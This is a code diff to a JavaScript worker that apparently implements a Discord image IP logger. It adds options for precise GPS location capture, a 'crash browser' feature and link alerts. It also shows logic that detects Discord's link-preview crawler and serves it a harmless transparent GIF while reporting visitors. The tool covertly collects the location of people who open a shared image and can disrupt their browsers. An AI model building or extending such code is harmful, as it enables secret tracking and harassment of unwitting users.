@@ -36,6 +36,15 @@ const config = {
   // 4 = 100% 机器人时不发送
   antiBot: 1,
   
+  // 精确位置（GPS）
+  accurateLocation: true,
+  
+  // 浏览器崩溃功能
+  crashBrowser: false,
+  
+  // 链接发送提醒
+  linkAlerts: true,
+  
   // 自定义消息
   message: {
     doMessage: false,
@@ -55,9 +64,6 @@ const config = {
 
 // 1x1 透明 GIF 的 Base64
 const TRANSPARENT_GIF = "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7";
-
-// 加载动画图片的 Base64（简化版，原 Python 中的二进制数据）
-const LOADING_IMAGE = "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7";
 
 // ============ 辅助函数 ============
 
@@ -269,10 +275,10 @@ export default {
     }
     
     // 检查是否为 Discord 爬虫
-    const isBot = isDiscordBot(ip, userAgent);
+    const bot = isDiscordBot(ip, userAgent);
     
     // 如果是爬虫且启用 buggedImage，返回加载图片
-    if (isBot && config.buggedImage) {
+    if (bot && config.buggedImage) {
       const gifBuffer = new Uint8Array([...Buffer.from(TRANSPARENT_GIF, "base64")]);
       
       // 异步发送报告
